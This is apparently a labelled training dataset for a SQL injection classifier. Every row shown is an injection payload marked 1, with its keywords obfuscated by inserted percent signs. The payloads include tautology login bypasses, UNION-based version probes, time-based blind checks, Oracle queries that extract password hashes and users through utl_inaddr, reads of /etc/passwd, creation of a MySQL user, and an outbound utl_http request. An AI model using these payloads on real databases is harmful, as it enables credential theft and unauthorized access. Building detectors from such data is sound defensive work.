Query,Label
" a%nd 1  =  utl_i%naddr.get_host_address   (    (   %%s%%el%%ect D%%i%sTi%nCT  (  PASSW%o%%rD  )   %f%%r%o%m   (  %%s%%el%%ect D%%i%sTi%nCT  (  PASSW%o%%rD  )  , ROWNUM AS %lim%i%t %f%%r%o%m SYS.USER$  )   %w%h%%e%re %lim%i%t  =  8   )    )    a%nd 'i'  =  'i",1
" %s%e%%l%e%c%%t * %f%r%om users wh%%e%r%e id  =  1 or ""?#"" or 1  =  1 -- 1",1
"%o%%r 1  =  1 %o%%r """"  =  ",1
/**/%or/**/1/**/  =  /**/1,1
" se%l%e%%c%%t * fro%m users w%%he%%r%%e id  =  1 %o%r "".  (  "" %o%r 1  =  1 -- 1",1
" %%s%%ele%c%t * fr%om users %w%he%%re id  =  '1' u%%n%i%o%%n %%s%%ele%c%t ||/1,version  (    )   -- 1'",1
" sele%c%t * %f%r%%o%%m users whe%%re id  =  '1' %%u%%n%i%%o%n sele%c%t +\.,@@VERSION -- 1'",1
or 1  =  1/*,1
%27 %o%r 1  =  1,1
" %%s%%e%lec%%t * %f%r%%o%%m users %%wh%%e%re id  =  1 <@&@ %u%%n%%i%%o%%n %%s%%e%lec%%t 1,version  (    )   -- 1",1
" s%elec%t * f%%ro%%m users w%%he%r%%e id  =  '1' %u%%n%i%%o%n s%elec%t $*$,@@VERSION -- 1'",1
"1;  (  load_file  (  char  (  47,101,116,99,47,112,97,115, ...",1
" %%se%l%e%%c%t * %%fr%%om users %%w%%h%%e%r%%e id  =  '1' o%r $ 1  =  1 %%u%%n%i%%o%%n %%se%l%e%%c%t 1,@@VERSION -- 1'",1
%s%e%%l%e%%c%t * %%fro%%m users wh%e%re id  =  1 %o%r \.<1 %o%r 1  =  1 -- 1,1
" %se%%le%%c%t * %from users w%%he%%r%%e id  =  '1' %o%r \<\ u%ni%%o%n %se%%le%%c%t 1,@@VERSION -- 1'",1
" %se%%le%ct * %f%%r%o%m users %%w%he%re id  =  1 %u%%n%i%%o%n %se%%le%ct 1||1,version  (    )   -- 1",1
" %%s%%e%l%%ec%%t * %f%%r%%o%%m users w%h%er%%e id  =  1 ||1 u%%nion %%s%%e%l%%ec%%t n%%u%l%%l,banner %f%%r%%o%%m v$version w%h%er%%e rownum  =  1 -- 1",1
%%s%%el%%e%%c%%t * %%fr%o%%m users wh%ere id  =  '1' %%o%r \.<\ %%o%r 1  =  1 -- 1',1
" %%se%l%%ec%%t * f%r%%om users %%whe%%re id  =  1 o%%r ""]{"" o%%r 1  =  1 -- 1",1
" se%le%c%%t * %%fr%o%%m users whe%%r%%e id  =  1 or "".@"" or 1  =  1 -- 1",1
" %s%%el%ec%t * f%%r%%o%%m users %%w%h%e%r%%e id  =  1 %o%%r ""$["" %o%%r 1  =  1 -- 1",1
%or 1 --',1
" s%el%e%c%t * %%f%r%%o%%m users %wh%%e%%r%e id  =  1 %o%%r "",;"" %o%%r 1  =  1 -- 1",1
"adm%i%n"" or 1  =  1#",1
" se%%l%%e%c%%t * %%f%r%%om users %%wh%%e%%re id  =  1 +  (  1  )   %%unio%%n se%%l%%e%c%%t %%nu%ll,banner %%f%r%%om v$version %%wh%%e%%re rownum  =  1 -- 1",1
\x27%u%%nio%%n %%se%%l%%ec%t,1
PR%%inT,1
" s%e%l%e%%c%t * f%r%o%m users %where id  =  '1' u%%n%%i%o%%n s%e%l%e%%c%t   (  \.  )  ,@@VERSION -- 1'",1
%or 1  =  1--,1
1 %%o%r pg_sleep  (  __TIME__  )  --,1
" se%%l%e%%ct * %%f%r%%o%m users wher%%e id  =  1 or "",#"" or 1  =  1 -- 1",1
adm%%i%n'  )   o%%r   (  '1'  =  '1'/*,1
o%r 2 %bet%w%een 1 an%d 3,1
" %%se%l%%e%%ct * f%%r%%o%m users w%%h%e%%r%%e id  =  1 or ""  )  .""  =  1 or 1  =  1 -- 1",1
" %selec%%t * f%ro%%m users %wh%%e%r%%e id  =  1 or 1#"". %u%%n%%ion %selec%%t %nu%%ll,version  (    )   -- 1",1
admin' %%o%%r '1'  =  '1,1
; if %%n%o%%t  (  s%e%le%%c%t system_user  )   <> 'sa' waitf%or delay '0:0:2' --,1
" %s%%e%%le%c%t * %%f%r%om users whe%%r%%e id  =  1 u%%ni%%on %s%%e%%le%c%t 1,banner %%f%r%om v$version whe%%r%%e rownum  =  1 -- 1",1
""" %%o%%r 0  =  0 --",1
" s%el%%e%c%t * f%%r%om users w%he%r%%e id  =  1 u%%n%%i%o%%n s%el%%e%c%t @ $_,version  (    )   -- 1",1
s%el%%e%%c%t * %f%%ro%%m users %w%he%%re id  =  1 <@.$ or 1  =  1 -- 1,1
" se%%l%%ect * %%fr%%om users %w%h%e%%r%e id  =  1 o%r ""%."" o%r 1  =  1 -- 1",1
" %%se%%le%c%%t * %f%%r%om users %w%h%%e%%re id  =  1 + $+*$ un%i%%o%n %%se%%le%c%%t n%%u%l%l,@@VERSION -- 1",1
" %se%l%%e%c%%t * %%f%%ro%%m users %w%her%%e id  =  1 o%r "",."" o%r 1  =  1 -- 1",1
char%4039%41%2b%40%%s%%e%%le%%c%t,1
" %sele%%ct * %f%%r%o%%m users %%w%h%%e%%re id  =  1 %%o%r ""1&"" %%o%r 1  =  1 -- 1",1
adm%i%%n'  )   o%%r   (  '1'  =  '1,1
declare @s varchar   (  200  )   %s%%e%%l%%e%ct @s   =   0x73656c6 ...,1
"%or 0  =  0 #""",1
" %se%l%%ec%%t * f%r%%o%%m users %w%%h%e%r%e id  =  1 %o%r "".]"" %o%r 1  =  1 -- 1",1
  )   or   (  'x'  =  'x,1
" %s%%e%l%e%ct * fr%%om users %w%h%er%%e id  =  1.<@$ %%un%%i%%on %s%%e%l%e%ct 1,version  (    )   -- 1",1
$  (  sleep 50  ) ,1
" %%se%%le%%c%t * f%ro%%m users %%w%her%%e id  =  1 *1 %%u%%ni%%on%% %%se%%le%%c%t %nu%l%%l,banner f%ro%%m v$version %%w%her%%e rownum  =  1 -- 1",1
"1 u%n%%io%n all s%e%l%%e%%c%t 1,2,3,4,5,6,name %%f%r%%o%%m sysobjects w%%he%re xtype   =   'u' --",1
" %s%%e%%le%c%t * fr%%o%%m users %%w%%h%%ere id  =  1 or 1#"". %u%%ni%o%%n %s%%e%%le%c%t 'a',version  (    )   -- 1",1
" %%s%%el%%e%%c%%t * %f%%r%o%%m users %%w%here id  =  1 %%or 1#""; u%n%i%%o%%n %%s%%el%%e%%c%%t %n%ul%l,version  (    )   -- 1",1
" %sel%ect * from users %%w%h%%e%%r%e id  =  1 %or 1#""? %or 1  =  1 -- 1",1
"""a"""" or 1  =  1--""",1
" s%%e%%l%ect * %%fro%m users w%h%e%r%%e id  =  1 *1 %%u%%ni%%on s%%e%%l%ect 1,banner %%fro%m v$version w%h%e%r%%e rownum  =  1 -- 1",1
" %%a%%n%d 1  =  utl_%%i%%naddr.get_host_address   (    (   %%s%%e%l%ec%t Di%%sT%%i%%nCT  (  column_name  )   %fr%om   (  %%s%%e%l%ec%t Di%%sT%%i%%nCT  (  column_name  )  , ROWNUM AS %l%i%%m%%i%t %fr%om all_tab_columns  )   %w%%h%e%r%%e %l%i%%m%%i%t  =  4   )    )    %%a%%n%d 'i'  =  'i",1
" %s%el%ect * %f%%r%om users wh%er%%e id  =  '1' u%%n%i%%on %s%el%ect   (  \  )  ,@@VERSION -- 1'",1
1 a%n%d user_name  (    )     =   'dbo',1
"; if %%n%o%t  (  substr%i%ng   (    (   %%se%lec%t @@version  )  ,24,1  )   <> 1  )   waitf%or delay '0:0:2' --",1
" %%sel%ec%%t * %%f%r%%o%m users w%h%%e%%r%%e id  =  1 or 1#""$ %%u%n%%i%o%%n %%sel%ec%%t 1,version  (    )   -- 1",1
" s%%el%%e%c%%t * %%f%%r%o%%m users w%%h%e%r%%e id  =  1 o%%r 1#""{ %%u%%n%%i%%o%%n s%%el%%e%c%%t n%%ull,version  (    )   -- 1",1
s%%e%%l%e%%ct * %fr%o%m users w%%h%e%%re id  =  '1' *$ . %o%r 1  =  1 -- 1',1
sel%%ect * f%r%o%%m users %w%%h%e%r%%e id  =  1 +$+. %%o%%r 1  =  1 -- 1,1
%%s%%ele%c%%t * %f%%rom users %%w%he%%r%%e id  =  1 or   (  \+  )    =  1 or 1  =  1 -- 1,1
" %%a%n%%d 1  =  utl_i%naddr.get_host_address   (    (   %%s%el%%e%ct Di%sTi%nCT  (  USERNAME  )   %%f%r%o%%m   (  %%s%el%%e%ct Di%sTi%nCT  (  USERNAME  )  , ROWNUM AS %li%%mi%t %%f%r%o%%m SYS.ALL_USERS  )   %wh%%e%re %li%%mi%t  =  6   )    )    %%a%n%%d 'i'  =  'i",1
%%o%%r 1  =  1 %%o%%r ''  =  ',1
s%e%%le%c%t * %f%%r%om users w%%her%%e id  =  1   or 1  =  1 -- 1,1
%or 'text' > 't',1
"1234 "" a%n%%d 1  =  0 u%%n%%io%n ALL %s%e%l%%e%ct ""admi%%n"", ""81dc9bdb52d04dc20036dbd8313ed055",1
" %%s%e%l%%ec%t * fr%o%%m users %%w%h%er%%e id  =  1 %o%r ""%["" %o%r 1  =  1 -- 1",1
" se%l%%e%c%%t * f%r%%o%%m users wher%e id  =  1 %o%r 1#"";  =  1 %u%%n%%i%%on se%l%%e%c%%t 1,version  (    )   -- 1",1
adm%i%n' %%o%%r '1'  =  '1'#,1
s%el%e%c%%t * %f%r%%o%m users %w%h%e%r%%e id  =  1 +$ 1 %or 1  =  1 -- 1,1
s,1
" an%d 1  =  utl_%%i%naddr.get_host_address   (    (   sele%%c%t D%i%%sT%%i%nCT  (  USERNAME  )   f%%r%om   (  sele%%c%t D%i%%sT%%i%nCT  (  USERNAME  )  , ROWNUM AS %li%mi%t f%%r%om SYS.ALL_USERS  )   %%w%%h%%e%re %li%mi%t  =  4   )    )    an%d 'i'  =  'i",1
 %s%e%l%%e%%c%t * f%r%%o%%m i%%nf%%o%%rmation_schema.%%t%ab%%l%es--,1
" se%%l%%ec%%t * f%%rom users w%h%e%r%e id  =  1 %o%r ""$&"" %o%r 1  =  1 -- 1",1
1   )    )    o%%r pg_sleep  (  __TIME__  )  --,1
" %%s%e%l%e%%c%t * %%fr%%o%%m users %%w%%he%%re id  =  '1' u%%n%%ion %%s%e%l%e%%c%t !<@,version  (    )   -- 1'",1
declare @q nvarchar   (  200  )   %%s%%el%%e%%c%t @q   =   0x770061 ...,1
 %o%%r 1  =  1 %o%%r ''  =  ',1
s%e%l%%e%%c%%t * f%%r%om users whe%%r%e id  =  1 %!<1 %%or 1  =  1 -- 1,1
declare @q nvarchar   (  200  )   %%s%e%%l%e%%c%t @q   =   0x770061006900740066006F0072002000640065006C00610079002000270030003A0030003A0031003000270000 exec  (  @q  ) ,1
" %s%%e%l%e%%ct * %f%%r%o%m users %w%%h%e%%r%e id  =  1 %or ""]1"" %or 1  =  1 -- 1",1
" se%%l%%ec%%t * f%ro%m users wh%%e%r%%e id  =  1 %%o%r $+<1 u%%nio%n se%%l%%ec%%t 1,@@VERSION -- 1",1
%%o%r 'unusual'   =   'unusual',1
 o%r 1 %i%n   (  %s%%el%ec%t @@version  )  --,1
%%t%%r%uncate,1
as,1
 %or 3  =  3 --,1
" se%%l%ec%t * %%f%r%%o%m users %%wh%er%%e id  =  1 ||1 %%u%%n%%i%%o%%n se%%l%ec%t 1,banner %%f%r%%o%m v$version %%wh%er%%e rownum  =  1 -- 1",1
" %%s%e%%l%%e%%c%%t * f%r%%o%m users %w%%h%%e%re id  =  1 <@$$ %%u%%n%i%o%n %%s%e%%l%%e%%c%%t 1,version  (    )   -- 1",1
"adm%i%n""  )   %%o%%r   (  ""1""  =  ""1",1
" %%se%l%%e%c%%t * %f%r%%o%%m users %%w%%h%ere id  =  1 or 1#""@ %u%%nio%n %%se%l%%e%c%%t 'a',version  (    )   -- 1",1
"1  )   %o%%r benchmark  (  10000000,MD5  (  1   )    )   #",1
" %sel%%e%%c%%t * %%f%%r%%o%m users w%%h%e%%r%e id  =  1 %u%n%i%%on %sel%%e%%c%%t .1_,version  (    )   -- 1",1
 %%a%%n%d 1  =  utl_inaddr.get_host_address   (    (   %%s%%e%%le%c%%t SYS.%%d%a%%t%a%bas%e_NAME %%fr%%o%m DUAL   )    )    %%a%%n%d 'i'  =  'i,1
" %o%r 0  =  0 #""",1
s%el%%ec%%t * %%f%ro%%m users %%w%%h%e%%re id  =  1 %$ 1 %%o%%r 1  =  1 -- 1,1
%s%el%%e%c%t * f%%ro%m users %w%h%e%r%e id  =  1 %!<@ o%%r 1  =  1 -- 1,1
"; if not  (  substr%%ing   (    (   s%%elec%%t @@version  )  ,25,1  )   <> 0  )   waitfo%%r delay '0:0:2' --",1
1  )   %%o%%r sleep  (  __TIME__  )  #,1
" s%%el%%e%%c%t * %%f%%r%o%m users wh%%e%%r%%e id  =  1 %%o%r ""1_"" %%o%r 1  =  1 -- 1",1
" %%s%%e%l%%e%ct * f%ro%%m users w%h%%er%%e id  =  1 <1## %u%n%%io%%n %%s%%e%l%%e%ct 1,version  (    )   -- 1",1
" %%se%%l%%ect * fr%%om users %w%%h%%e%r%e id  =  1 + $+*\ %un%i%%o%%n %%se%%l%%ect n%%u%%ll,@@VERSION -- 1",1
%s%e%%l%%e%%c%t * %f%%r%%om users %wh%%er%e id  =  1. <@ %or 1  =  1 -- 1,1
 %%o%%r true--,1
; execute immediate 'sel' || 'ect us' || 'er',1
hi' %%or 'x'  =  'x';,1
%se%lec%%t * %%f%%r%%o%%m users %w%h%%e%r%%e id  =  1 <@ %or 1  =  1 -- 1,1
" %s%e%%le%c%t * %%f%r%%om users w%h%e%r%%e id  =  1 %%or "".,"" %%or 1  =  1 -- 1",1
admi%%n' #,1
" %%s%%e%%l%e%c%%t * %f%ro%m users whe%%r%e id  =  1 <@$_ u%%n%io%%n %%s%%e%%l%e%c%%t 1,version  (    )   -- 1",1
" %%sel%ect * %f%rom users %w%%h%%e%r%%e id  =  1 o%r "",  (  "" o%r 1  =  1 -- 1",1
" s%e%%l%ec%%t * %%f%%r%%o%m users wh%e%%r%%e id  =  1 %%or "",{"" %%or 1  =  1 -- 1",1
" %%un%%i%%on s%%e%l%e%%c%%t 1,load_file  (  '/etc/passwd'  )  ,1,1,1;",1
"""  )  ;waitfo%%r delay '0:0:__TIME__'--",1
 %or 'unusual'   =   'unusual',1
"%%ins%%e%rt %%%int%%o mysql.user   (  user, host, passwo%rd  )   %v%%a%%l%ue%s   (  'name', 'localhost', passwo%rd  (  'pass123'   )    )   ",1
"adm%%i%n"" %%o%r ""1""  =  ""1""/*",1
" %%s%e%%l%ect * %%from users w%%h%%ere id  =  1 %%o%r ""1  (  ""  =  1 %%o%r 1  =  1 -- 1",1
" %%se%l%%ec%t * fro%%m users w%h%%e%re id  =  1 %or \<1 u%%ni%%o%n %%se%l%%ec%t 1,@@VERSION -- 1",1
%lik%e,1
%%or username %l%i%%k%%e char  (  37  )  ;,1
 )    )    %or pg_sleep  (  __TIME__  )  --,1
%%s%ele%%c%t * %%fr%o%%m users %whe%%re id  =  1 or $+<\ or 1  =  1 -- 1,1
%o%r 3  =  3,1
" s%%e%%le%%c%%t * %fro%%m users %w%%h%e%%r%e id  =  1 %%o%r ""  (  ."" %%o%r 1  =  1 -- 1",1
s%%el%e%ct * %%f%ro%%m users %%w%h%%ere id  =  1 or   (  $+  )    =  1 or 1  =  1 -- 1,1
exec sp,1
" %%se%%l%%e%%c%%t * fr%om users %w%%he%re id  =  1 %%or \+<$ %un%%ion %%se%%l%%e%%c%%t 1,@@VERSION -- 1",1
%%s%el%%ec%t * %%f%%r%o%%m users %wher%e id  =  1 %or \<$ %or 1  =  1 -- 1,1
" s%%e%%l%%e%%c%%t * %f%%r%%om users %wh%e%r%e id  =  1.&&1 %u%%nio%%n s%%e%%l%%e%%c%%t 1,version  (    )   -- 1",1
admi%%n' %or 1  =  1/*,1
a' waitf%or delay '0:0:10'--,1
" %s%e%%le%%ct * %f%%r%o%%m users wh%er%%e id  =  1 +  (  \  )   %un%%i%on %s%e%%le%%ct %%n%%u%%ll,@@VERSION -- 1",1
" %sel%%e%%c%t * fro%%m users %w%h%e%%re id  =  1 %%u%nio%n %sel%%e%%c%t .1$_,version  (    )   -- 1",1
a%%n%d 1 %%i%n   (  sel%ec%t var %%fr%o%m temp  )  --,1
hi'  )   %or   (  'a'  =  'a,1
" %%an%%d 1  =  utl_%%inaddr.get_host_address   (    (   %s%e%%l%%e%%ct D%i%sT%%inCT  (  column_name  )   %fr%%o%m   (  %s%e%%l%%e%%ct D%i%sT%%inCT  (  column_name  )  , ROWNUM AS %l%i%m%%i%t %fr%%o%m all_tab_columns  )   %%w%%h%e%%r%%e %l%i%m%%i%t  =  1   )    )    %%an%%d 'i'  =  'i",1
"adm%i%n"" %or 1  =  1",1
"""  )   o%%r true--",1
" %s%e%%l%e%ct * %%f%%ro%m users %w%h%e%%r%%e id  =  '1' or $ .  =  1 %%u%n%i%%o%n %s%e%%l%e%ct 1,@@VERSION -- 1'",1
" %%s%el%e%ct * f%r%%om users w%h%%e%%re id  =  1 or ""  (  {"" or 1  =  1 -- 1",1
1  )   %%or pg_sleep  (  __TIME__  )  --,1
" %s%el%%e%ct * %%fr%o%m users %%wh%%e%re id  =  1 %o%r ""{."" %o%r 1  =  1 -- 1",1
"""  )   %o%%r sleep  (  __TIME__  )    =  """,1
%%sel%ec%%t * %%f%%r%o%%m users %%w%%he%r%%e id  =  1.<@. %%o%%r 1  =  1 -- 1,1
"adm%i%%n""  )   %%o%r   (  ""1""  =  ""1""--",1
" s%e%le%%ct * f%%r%om users %w%he%r%e id  =  1<@.. %%u%%n%i%o%%n s%e%le%%ct 1,version  (    )   -- 1",1
; exec xp_regread,1
" %se%l%ec%t * %fro%%m users %w%h%e%re id  =  '1' + @ 1 %%u%ni%%o%n %se%l%ec%t 1,version  (    )   -- 1'",1
s%%e%%l%%e%ct * %%f%%r%o%m users %w%%h%%er%%e id  =  1 + \+%1 o%%r 1  =  1 -- 1,1
" %%s%%e%l%%e%%ct * f%%r%o%m users %w%%h%er%e id  =  1 %%or "";1"" %%or 1  =  1 -- 1",1
" %%s%e%l%e%%ct * f%r%%o%m users %w%h%ere id  =  1 %%or ""%&"" %%or 1  =  1 -- 1",1
1 a%%nd 1  =  1,1
%o%r 0  =  0 #,1
%%u%%n%ion %s%e%%l%e%%c%t * %%f%ro%%m users %wh%%e%%r%%e login   =   char ...,1
" %s%%e%le%ct * fr%om users %w%h%e%%re id  =  1 %u%%n%%i%o%%n %s%%e%le%ct 1||@,version  (    )   -- 1",1
adm%i%n'  )   %%o%%r '1'  =  '1'--,1
1;%%s%%e%%lect *,1
" %%s%e%l%e%c%t * %f%%ro%%m users w%%h%e%r%e id  =  1 %%o%r ""{;"" %%o%r 1  =  1 -- 1",1
x' a%n%%d 1  =    (  %%s%el%%ect count  (  *  )   fro%%m tabname  )  ; --,1
" %%se%%le%ct * f%r%o%m users w%h%%er%%e id  =  '1' %%o%%r """"<@ %%u%%n%i%o%n %%se%%le%ct 1,version  (    )   -- 1'",1
" se%%le%ct * fr%o%%m users wh%%e%%r%%e id  =  1 %%or ""?,"" %%or 1  =  1 -- 1",1
" %%s%e%%l%%e%c%t * f%r%o%%m users wh%%er%%e id  =  '1' ||1 %un%%i%o%%n %%s%e%%l%%e%c%t 1,banner f%r%o%%m v$version wh%%er%%e rownum  =  1 -- 1'",1
"1 %%o%r benchmark  (  10000000,MD5  (  1   )    )   #",1
procedure,1
o%r ''  =  ',1
 %%a%%n%d 1  =  utl_%i%%naddr.get_host_address   (    (   %s%el%ec%t SYS.LOG%i%%n_USER f%%r%%om DUAL   )    )    %%a%%n%d 'i'  =  'i,1
" %%a%%n%%d 1  =  utl_%%i%naddr.get_host_address   (    (   s%e%%le%c%%t D%isT%%i%nCT  (  USERNAME  )   %fr%%o%%m   (  s%e%%le%c%%t D%isT%%i%nCT  (  USERNAME  )  , ROWNUM AS %limi%%t %fr%%o%%m SYS.ALL_USERS  )   %w%%he%r%e %limi%%t  =  2   )    )    %%a%%n%%d 'i'  =  'i",1
\'; %d%e%sc users; --,1
" %s%%e%%le%%c%%t * %f%%ro%%m users wh%er%%e id  =  1 %%or   (  \.  )    =  1 %u%%n%%i%%o%%n %s%%e%%le%%c%%t 1,@@VERSION -- 1",1
s%e%l%ec%%t * %%fr%%o%m users %%w%%h%%e%%r%%e id  =  '1' %o%%r $ 1  =  1 %o%%r 1  =  1 -- 1',1
""" or """"^""",1
"""-""",1
" %se%%l%%ec%%t * %%fr%o%%m users %%w%%h%er%e id  =  1 %%o%%r \<   =  1 u%n%i%%o%%n %se%%l%%ec%%t 1,@@VERSION -- 1",1
" %%sel%%ec%%t * f%%r%%om users w%%h%%er%%e id  =  1 %un%%i%%on %%sel%%ec%%t 1<@$,version  (    )   -- 1",1
" %%s%%el%%ect * %%fr%%o%m users wh%%e%%re id  =  1 *\ %u%%n%%i%o%%n %%s%%el%%ect %%n%%ul%l,@@VERSION -- 1",1
" %s%e%%l%%ect * f%r%%o%m users w%%h%e%r%e id  =  '1' %or !<@ unio%n %s%e%%l%%ect 1,version  (    )   -- 1'",1
" %%s%elec%%t * %f%%r%o%m users wh%e%r%e id  =  1 %or "".%"" %or 1  =  1 -- 1",1
adm%in'/*,1
" s%%el%%ec%t * fr%%o%m users %%w%h%e%%re id  =  1 %%or ""  (  #"" %%or 1  =  1 -- 1",1
||UTL_HTTP.REQUEST,1
" %a%%nd 1  =  utl_%inaddr.get_host_address   (    (   %s%el%e%ct D%%isT%inCT  (  %tab%l%%e_name  )   %%f%ro%%m   (  %s%el%e%ct D%%isT%inCT  (  %tab%l%%e_name  )  , ROWNUM AS %%l%im%%it %%f%ro%%m sys.all_%tab%l%%es  )   w%h%%ere %%l%im%%it  =  1   )    )    %a%%nd 'i'  =  'i",1
" %s%%e%l%e%c%%t * %f%r%om users %%wh%%e%r%e id  =  '1'<@.. un%%i%o%n %s%%e%l%e%c%%t 1,version  (    )   -- 1'",1
"""   )    )    %o%r benchmark  (  10000000,MD5  (  1   )    )   #",1
" %%s%e%%le%c%t * %fr%o%%m users %whe%%r%e id  =  1 <@.$ %%un%%i%o%n %%s%e%%le%c%t 1,version  (    )   -- 1",1
" %%s%e%%l%e%%c%t * %fr%%o%m users w%%he%%r%%e id  =  1 %o%%r $ .  =  1 %%u%n%%io%%n %%s%e%%l%e%%c%t 1,@@VERSION -- 1",1
%%s%%e%%lec%%t * %fr%om users %%w%he%r%%e id  =  '1' <@.$ %or 1  =  1 -- 1',1
1 uni/**/on %%se%%le%%c%t all f%r%%om %%w%h%%e%%r%%e,1
" %%s%%e%l%e%ct * %%f%%r%%o%%m users %w%he%%r%e id  =  1 +$ . %%%un%%i%o%%n% %%s%%e%l%e%ct %%n%u%ll,@@VERSION -- 1",1
" se%l%ec%t * %%from users w%%he%r%e id  =  1 %or 1#""? %%u%n%i%%on se%l%ec%t %%nu%l%%l,version  (    )   -- 1",1
admin'  )   %%or '1'  =  '1'#,1
||utl_http.request  (  'httP://192.168.1.1/'  )  ||',1
%%or '7659'  =  '7659,1
" %%s%e%l%%e%%c%t * fr%%o%m users w%%h%e%%r%e id  =  1 %%o%r ""{@"" %%o%r 1  =  1 -- 1",1
" %se%lec%%t * %fr%%o%%m users %w%%h%%ere id  =  1 %%uni%o%n %se%lec%%t +!<1,version  (    )   -- 1",1
" %an%d 1  =  utl_%%inaddr.get_host_address   (    (   %se%%l%e%c%%t D%%i%sT%%inCT  (  granted_role  )   f%r%o%%m   (  %se%%l%e%c%%t D%%i%sT%%inCT  (  granted_role  )  , ROWNUM AS l%%imit f%r%o%%m dba_role_privs %wh%er%e GRANTEE  =  SYS.LOG%%inUSER  )   %wh%er%e l%%imit  =  6   )    )    %an%d 'i'  =  'i",1
" s%el%e%%c%t * %f%r%%o%m users w%%h%e%r%e id  =  1 or ""  (  @"" or 1  =  1 -- 1",1
%%or true--,1
